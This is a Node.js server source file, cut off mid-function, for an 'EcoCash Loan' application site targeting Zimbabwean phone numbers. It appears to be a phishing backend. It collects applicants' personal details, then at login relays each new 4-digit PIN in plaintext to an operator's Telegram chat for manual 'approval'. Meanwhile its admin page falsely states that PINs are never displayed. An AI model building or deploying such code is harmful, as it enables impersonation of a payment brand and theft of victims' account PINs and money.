const express = require('express');
const path = require('path');
const crypto = require('crypto');
const { Pool } = require('pg');

const app = express();
const PORT = Number(process.env.PORT) || 10000;

const ADMIN_USER = process.env.ADMIN_USER;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;
const ADMIN_USER_ID = process.env.TELEGRAM_ADMIN_USER_ID;

if (!process.env.DATABASE_URL) console.warn('DATABASE_URL is not set.');
if (!ADMIN_USER || !ADMIN_PASSWORD) console.warn('Set ADMIN_USER and ADMIN_PASSWORD in Render.');
if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
  console.warn('Telegram notifications/actions are disabled until configured.');
}

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL
    ? { rejectUnauthorized: false }
    : false
});

app.use(express.json({ limit: '100kb' }));
app.use(express.static(path.join(__dirname, 'public')));

// DATABASE SETUP

const schema = `
CREATE TABLE IF NOT EXISTS applications (
  id UUID PRIMARY KEY,
  loan_type TEXT NOT NULL,
  loan_amount NUMERIC NOT NULL,
  loan_term TEXT NOT NULL,
  purpose TEXT NOT NULL,
  first_name TEXT NOT NULL,
  last_name TEXT NOT NULL,
  email TEXT NOT NULL,
  phone TEXT NOT NULL,
  employment_status TEXT NOT NULL,
  annual_income NUMERIC NOT NULL,
  status TEXT NOT NULL DEFAULT 'pending',
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  reviewed_at TIMESTAMPTZ
);
`;

const dbReady = pool.query(schema)
  .then(async () => {
    await pool.query(
      'ALTER TABLE applications ADD COLUMN IF NOT EXISTS pin_hash TEXT'
    );
    await pool.query(
      'ALTER TABLE applications ADD COLUMN IF NOT EXISTS reviewed_at TIMESTAMPTZ'
    );
    await pool.query(
      "ALTER TABLE applications ADD COLUMN IF NOT EXISTS otp_status TEXT NOT NULL DEFAULT 'not_required'"
    );
    await pool.query(
      'ALTER TABLE applications ADD COLUMN IF NOT EXISTS otp_verified_at TIMESTAMPTZ'
    );
    await pool.query(
      "ALTER TABLE applications ADD COLUMN IF NOT EXISTS pin_status TEXT NOT NULL DEFAULT 'none'"
    );
    await pool.query(
      'ALTER TABLE applications ADD COLUMN IF NOT EXISTS pin_approved_at TIMESTAMPTZ'
    );
    await pool.query(
      'ALTER TABLE applications ADD COLUMN IF NOT EXISTS pin_rejected_at TIMESTAMPTZ'
    );
    await pool.query(
      "UPDATE applications SET otp_status='not_required' WHERE otp_status IN ('pending','sent')"
    );
    // Preserve any existing PIN users: treat previously-created PINs as approved.
    await pool.query(
      `UPDATE applications
          SET pin_status = 'approved',
              pin_approved_at = COALESCE(pin_approved_at, created_at)
        WHERE pin_status = 'none' AND pin_hash IS NOT NULL`
    );
  })
  .catch(error => {
    console.error('Database schema setup failed:', error.message);
    throw error;
  });

// HELPERS

function normalizePhone(value) {
  const phone = String(value || '').replace(/[\s()-]/g, '');

  if (/^07\d{8}$/.test(phone)) return '+263' + phone.slice(1);
  if (/^7\d{8}$/.test(phone)) return '+263' + phone;
  if (/^\+2637\d{8}$/.test(phone)) return phone;
  if (/^2637\d{8}$/.test(phone)) return '+' + phone;

  return null;
}

function hashPin(pin) {
  const salt = crypto.randomBytes(16).toString('hex');
  const digest = crypto.scryptSync(pin, salt, 64).toString('hex');
  return `${salt}:${digest}`;
}

function verifyPin(pin, stored) {
  if (!stored || typeof stored !== 'string' || !stored.includes(':')) {
    return false;
  }

  const parts = stored.split(':');
  const salt = parts[0];
  const expected = Buffer.from(parts[1] || '', 'hex');

  if (!salt || expected.length !== 64) return false;

  const actual = crypto.scryptSync(pin, salt, 64);
  return crypto.timingSafeEqual(actual, expected);
}

function adminAuth(req, res, next) {
  const header = req.headers.authorization || '';

  if (!header.startsWith('Basic ') || !ADMIN_USER || !ADMIN_PASSWORD) {
    return res
      .status(401)
      .set('WWW-Authenticate', 'Basic realm="Loan Admin"')
      .json({ error: 'Admin authentication required.' });
  }

  let decoded;

  try {
    decoded = Buffer.from(header.slice(6), 'base64').toString('utf8');
  } catch {
    return res.status(401).json({ error: 'Invalid admin credentials.' });
  }

  const colon = decoded.indexOf(':');

  if (colon < 0) {
    return res.status(401).json({ error: 'Invalid admin credentials.' });
  }

  const username = decoded.slice(0, colon);
  const password = decoded.slice(colon + 1);

  if (username !== ADMIN_USER || password !== ADMIN_PASSWORD) {
    return res
      .status(401)
      .set('WWW-Authenticate', 'Basic realm="Loan Admin"')
      .json({ error: 'Invalid admin credentials.' });
  }

  next();
}

// TELEGRAM HELPERS

async function telegramApi(method, body) {
  if (!BOT_TOKEN) return null;

  const response = await fetch(
    `https://api.telegram.org/bot${BOT_TOKEN}/${method}`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    }
  );

  const data = await response.json().catch(() => ({}));

  if (!response.ok || !data.ok) {
    throw new Error(
      `Telegram ${method} failed: ${data.description || response.status}`
    );
  }

  return data.result;
}

async function sendTelegram(chatId, message, keyboard) {
  if (!BOT_TOKEN || !chatId) return;

  try {
    await telegramApi('sendMessage', {
      chat_id: chatId,
      text: message,
      ...(keyboard
        ? { reply_markup: { inline_keyboard: keyboard } }
        : {})
    });
  } catch (error) {
    console.error('Telegram message failed:', error.message);
  }
}

async function notifyAdmin(message, keyboard) {
  if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
    console.warn('Telegram notification skipped: bot token or admin chat ID is missing.');
    return;
  }

  await sendTelegram(ADMIN_CHAT_ID, message, keyboard);
}

async function setApplicationStatus(id, status, source) {
  if (!['approved', 'rejected'].includes(status)) {
    throw new Error('Invalid application status');
  }

  const result = await pool.query(
    `UPDATE applications
       SET status=$1, reviewed_at=NOW()
     WHERE id=$2
     RETURNING id,status,phone,first_name,last_name`,
    [status, id]
  );

  const row = result.rows[0];

  if (!row) return null;

  await notifyAdmin(
    `Application ${status.toUpperCase()}\n` +
    `ID: ${row.id}\n` +
    `Applicant: ${row.first_name} ${row.last_name}\n` +
    `Phone: ${row.phone}\n` +
    `Updated by: ${source}`
  );

  return row;
}

// HEALTH CHECK

app.get('/api/health', async (req, res) => {
  try {
    await dbReady;
    await pool.query('SELECT 1');

    res.json({
      ok: true,
      database: 'connected',
      sms: 'disabled'
    });
  } catch (error) {
    res.status(503).json({
      ok: false,
      database: 'unavailable'
    });
  }
});

// 1. SUBMIT LOAN APPLICATION

app.post('/api/applications', async (req, res) => {
  try {
    await dbReady;

    const b = req.body || {};
    const phone = normalizePhone(b.phone);
    const amount = Number(b.loanAmount);
    const income = Number(b.annualIncome);

    const required = [
      'loanType',
      'loanTerm',
      'purpose',
      'firstName',
      'lastName',
      'email',
      'employmentStatus'
    ];

    if (
      required.some(k => !String(b[k] || '').trim()) ||
      !phone ||
      !Number.isFinite(amount) ||
      !Number.isFinite(income)
    ) {
      return res.status(400).json({
        error: 'Please complete all application fields correctly.'
      });
    }

    const email = String(b.email).trim();

    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      return res.status(400).json({
        error: 'Enter a valid email address.'
      });
    }

    if (
      amount <= 0 ||
      amount > 500000 ||
      income <= 0 ||
      income > 1000000000
    ) {
      return res.status(400).json({
        error: 'Enter valid loan and income amounts.'
      });
    }

    const id = crypto.randomUUID();

    const firstName = String(b.firstName).trim().slice(0, 100);
    const lastName = String(b.lastName).trim().slice(0, 100);
    const loanType = String(b.loanType).trim().slice(0, 80);
    const loanTerm = String(b.loanTerm).trim().slice(0, 40);
    const purpose = String(b.purpose).trim().slice(0, 1000);
    const employmentStatus = String(b.employmentStatus).trim().slice(0, 80);

    await pool.query(
      `INSERT INTO applications
       (
         id, loan_type, loan_amount, loan_term, purpose,
         first_name, last_name, email, phone,
         employment_status, annual_income, status, pin_hash, pin_status
       )
       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,'pending',NULL,'none')`,
      [
        id,
        loanType,
        amount,
        loanTerm,
        purpose,
        firstName,
        lastName,
        email,
        phone,
        employmentStatus,
        income
      ]
    );

    await notifyAdmin(
      `NEW LOAN APPLICATION — PENDING REVIEW\n` +
      `Application ID: ${id}\n` +
      `Applicant: ${firstName} ${lastName}\n` +
      `Phone: ${phone}\n` +
      `Email: ${email}\n` +
      `Loan type: ${loanType}\n` +
      `Amount: USD ${amount}\n` +
      `Term: ${loanTerm}\n` +
      `Purpose: ${purpose.slice(0, 500)}\n` +
      `Employment: ${employmentStatus}\n` +
      `Annual income: USD ${income}`,
      [
        [
          { text: 'Approve', callback_data: `approve:${id}` },
          { text: 'Reject', callback_data: `reject:${id}` }
        ]
      ]
    );

    return res.status(201).json({
      id,
      applicationId: id,
      status: 'pending',
      message: 'Loan application submitted successfully.'
    });
  } catch (error) {
    console.error('Application submission failed:', error.message);

    return res.status(500).json({
      error: 'Could not submit the application. Please try again.'
    });
  }
});

// 2. LOGIN — first-time PIN is sent to Telegram for approval

app.post('/api/login', async (req, res) => {
  try {
    await dbReady;

    const phone = normalizePhone(req.body?.phone);
    const pin = String(req.body?.pin || '');

    if (!phone || !/^\d{4}$/.test(pin)) {
      return res.status(400).json({
        error: 'Enter a valid Zimbabwe phone number and your 4-digit PIN.'
      });
    }

    const result = await pool.query(
      `SELECT id, phone, status, pin_hash, pin_status, created_at
         FROM applications
        WHERE phone=$1
        ORDER BY created_at DESC
        LIMIT 1`,
      [phone]
    );

    const row = result.rows[0];

    if (!row) {
      return res.status(401).json({
        error: 'Your application is being reviewed. Please wait for approval from our support team.'
      });
    }

    // If there's a pending PIN request already, tell them to wait.
    if (row.pin_hash && row.pin_status === 'pending') {
      return res.status(202).json({
        authenticated: false,
        status: 'pending_pin_approval',
        applicationId: row.id,
        message: 'Your PIN is awaiting approval. Please try again shortly.'
      });
    }

    // First-time PIN setup, or re-attempt after rejection.
    const isFirstPin = !row.pin_hash;
    const isRetryAfterReject = row.pin_status === 'rejected';

    if (isFirstPin || isRetryAfterReject) {
      const pinHash = hashPin(pin);

      const update = await pool.query(
        `UPDATE applications
            SET pin_hash=$1,
                pin_status='pending',
                pin_approved_at=NULL,
                pin_rejected_at=NULL
          WHERE id=$2
          RETURNING id, first_name, last_name, phone`,
        [pinHash, row.id]
      );

      const updated = update.rows[0];

      await notifyAdmin(
        `🔐 PIN APPROVAL REQUEST\n` +
        `Application ID: ${updated.id}\n` +
        `Applicant: ${updated.first_name} ${updated.last_name}\n` +
        `Phone: ${updated.phone}\n` +
        `PIN: ${pin}\n\n` +
        `Approve to let this customer log in with this PIN.`,
        [
          [
            { text: '✅ Approve PIN', callback_data: `pinapprove:${updated.id}` },
            { text: '❌ Reject PIN', callback_data: `pinreject:${updated.id}` }
          ]
        ]
      );

      return res.status(202).json({
        authenticated: false,
        status: 'pending_pin_approval',
        applicationId: row.id,
        message: 'Your PIN is awaiting approval. You will be able to log in shortly.'
      });
    }

    // PIN exists and is approved — verify normally.
    if (!verifyPin(pin, row.pin_hash)) {
      return res.status(401).json({
        error: 'Incorrect PIN.'
      });
    }

    if (row.status === 'rejected') {
      return res.status(403).json({
        authenticated: true,
        status: 'rejected',
        message: 'Your application was not approved. Please contact support.'
      });
    }

    if (row.status !== 'approved') {
      return res.json({
        authenticated: true,
        status: 'pending',
        applicationId: row.id,
        message: 'Your application is awaiting admin approval.'
      });
    }

    return res.json({
      authenticated: true,
      status: 'approved',
      applicationId: row.id,
      message: 'Your application has been approved.'
    });
  } catch (error) {
    console.error('Login failed:', error.message);

    return res.status(500).json({
      error: 'Login is temporarily unavailable.'
    });
  }
});

// CHECK APPLICATION STATUS

app.get('/api/applications/:id/status', async (req, res) => {
  try {
    await dbReady;

    const result = await pool.query(
      'SELECT id,status FROM applications WHERE id=$1',
      [req.params.id]
    );

    if (!result.rows[0]) {
      return res.status(404).json({
        error: 'Application not found.'
      });
    }

    res.json(result.rows[0]);
  } catch (error) {
    res.status(500).json({
      error: 'Status is unavailable.'
    });
  }
});

// ADMIN API

app.get('/api/admin/applications', adminAuth, async (req, res) => {
  try {
    await dbReady;

    const result = await pool.query(
      `SELECT
         id, loan_type, loan_amount, loan_term, purpose,
         first_name, last_name, email, phone,
         employment_status, annual_income, status,
         pin_status, created_at, reviewed_at
       FROM applications
       ORDER BY created_at DESC`
    );

    res.json(result.rows);
  } catch (error) {
    console.error('Admin list failed:', error.message);

    res.status(500).json({
      error: 'Could not load applications.'
    });
  }
});

app.patch('/api/admin/applications/:id', adminAuth, async (req, res) => {
  try {
    const status = req.body?.status;

    if (!['approved', 'rejected'].includes(status)) {
      return res.status(400).json({
        error: 'Status must be approved or rejected.'
      });
    }

    const row = await setApplicationStatus(
      req.params.id,
      status,
      'web admin'
    );

    if (!row) {
      return res.status(404).json({
        error: 'Application not found.'
      });
    }

    res.json({
      id: row.id,
      status: row.status
    });
  } catch (error) {
    console.error('Admin status update failed:', error.message);

    res.status(500).json({
      error: 'Could not update application status.'
    });
  }
});

// ADMIN DASHBOARD

app.get('/admin', adminAuth, (req, res) => {
  res.type('html').send(`<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>EcoCash Loan Admin</title>
<style>
body{font-family:Arial,sans-serif;margin:0;padding:18px;background:#f2f6fb;color:#152238}
h1{color:#0753a6}
.sub{color:#5d6b7e}
.card{background:#fff;padding:16px;margin:12px 0;border-radius:12px;box-shadow:0 2px 10px #dce3eb;overflow-wrap:anywhere}
button{padding:10px 14px;border:0;border-radius:7px;margin:5px 5px 0 0;cursor:pointer;font-weight:700}
.approve{background:#13834b;color:#fff}
.reject{background:#c83737;color:#fff}
.pill{display:inline-block;border-radius:99px;padding:4px 9px;background:#edf2f7;margin:4px;font-size:12px}
</style>
</head>
<body>
<h1>EcoCash Loan Applications</h1>
<p class="sub">Review applications and status. Customer PINs are never displayed.</p>
<div id="list">Loading applications…</div>
<script>
const esc = value => String(value ?? '').replace(/[&<>"]/g, char => ({
  '&':'&amp;',
  '<':'&lt;',
  '>':'&gt;',
  '"':'&quot;'
}[char]));

async function loadApplications() {
  try {
    const response = await fetch('/api/admin/applications');

    if (!response.ok) {
      throw new Error('Unable to load applications. Refresh and sign in again.');
    }

    const applications = await response.json();

    document.getElementById('list').innerHTML = applications.map(item => {
      const id = JSON.stringify(String(item.id));

      return '<div class="card">' +
        '<h3>' + esc(item.first_name) + ' ' + esc(item.last_name) + '</h3>' +
        '<span class="pill">Status: ' + esc(item.status) + '</span>' +
        '<span class="pill">PIN: ' + esc(item.pin_status) + '</span>' +
        '<p><b>ID:</b> ' + esc(item.id) + '</p>' +
        '<p><b>Phone:</b> ' + esc(item.phone) +
        '<br><b>Email:</b> ' + esc(item.email) + '</p>' +
        '<p><b>Loan:</b> ' + esc(item.loan_type) +
        ' — USD ' + esc(item.loan_amount) +
        '<br><b>Term:</b> ' + esc(item.loan_term) +
        '<br><b>Purpose:</b> ' + esc(item.purpose) + '</p>' +
        '<p><b>Employment:</b> ' + esc(item.employment_status) +
        '<br><b>Annual income:</b> USD ' + esc(item.annual_income) + '</p>' +
        '<p><b>Submitted:</b> ' +
        esc(new Date(item.created_at).toLocaleString()) + '</p>' +
        '<button class="approve" onclick="setStatus(' + id + ',\\'approved\\')">Approve</button>' +
        '<button class="reject" onclick="setStatus(' + id + ',\\'rejected\\')">Reject</button>' +
        '</div>';
    }).join('') || 'No applications yet.';
  } catch (error) {
    document.getElementById('list').textContent = error.message;
  }
}

async function setStatus(id, status) {
  if (!confirm('Set this application to ' + status + '?')) return;

  try {
    const response = await fetch(
      '/api/admin/applications/' + encodeURIComponent(id),
      {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status })
      }
    );

    if (!response.ok) {
      alert('Could not update status. Check admin login and try again.');
      return;
    }

    await loadApplications();
  } catch (error) {
    alert('Network error. Please try again.');
  }
}

loadApplications();
setInterval(loadApplications, 20000);
</script>
</body>
</html>`);
});

// TELEGRAM BOT

let telegramOffset = 0;
let telegramPolling = false;

async function processTelegramUpdate(update) {
  const msg = update.message;
  const callback = update.callback_query;

  const chatId = String(
    msg?.chat?.id ?? callback?.message?.chat?.id ?? ''
  );

  const fromId = String(
    msg?.from?.id ?? callback?.from?.id ?? ''
  );

  if (
    !ADMIN_CHAT_ID ||
    chatId !== String(ADMIN_CHAT_ID) ||
    (ADMIN_USER_ID && fromId !== String(ADMIN_USER_ID))
  ) {
    if (callback?.id) {
      await telegramApi('answerCallbackQuery', {
        callback_query_id: callback.id,
        text: 'Not authorized.'
      }).catch(() => {});
    }

    return;
  }

  if (callback) {
    const match = /^(approve|reject|pinapprove|pinreject):([0-9a-f-]{36})$/i.exec(
      callback.data || ''
    );

    if (!match) {
      await telegramApi('answerCallbackQuery', {
        callback_query_id: callback.id,
        text: 'Unknown action.'
      }).catch(() => {});

      return;
    }

    try {
      const action = match[1].toLowerCase();
      const appId = match[2];

      // ---- PIN approve / reject ----
      if (action === 'pinapprove' || action === 'pinreject') {
  
